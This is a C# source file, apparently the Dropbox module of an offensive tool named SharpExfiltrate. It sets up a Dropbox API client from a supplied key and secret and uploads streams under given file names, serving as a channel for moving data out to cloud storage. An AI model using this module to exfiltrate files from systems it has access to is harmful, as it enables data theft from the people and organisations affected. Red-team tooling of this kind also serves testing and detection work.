using Dropbox.Api;
using Dropbox.Api.Files;
using SharpExfiltrate.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace SharpExfiltrate.Modules
{
    class DropBox
    {
        public DropBox(DropBoxOptions dropBoxOptions)
        {
            this.dropBoxOptions = dropBoxOptions;
        }

        public DropBoxOptions dropBoxOptions { get; set; }

        public DropboxClient dropBoxClient { get; set; }


        public async Task Upload(Stream stream, string fileName)
        {

            var updated = await dropBoxClient.Files.UploadAsync(fileName,
                WriteMode.Overwrite.Instance,
                body: stream);
        }

        public async Task Init()
        {

            // Specify socket level timeout which decides maximum waiting time when no bytes are
            // received by the socket.
            var httpClient = new HttpClient()
            {
                // Specify request level timeout which decides maximum time that can be spent on
                // download/upload files.
                Timeout = TimeSpan.FromMinutes(20)
            };

            var config = new DropboxClientConfig("SimpleOAuthApp")
            {
                HttpClient = httpClient
            };

            
            string[] scopeList = new string[2] { "files.content.write", "account_info.read" };

            //var uid = await AcquireAccessToken(scopeList, IncludeGrantedScopes.None);

            dropBoxClient = new DropboxClient("", dropBoxOptions.ApiKey, dropBoxOptions.ApiSecret, config);
        }
    }

}
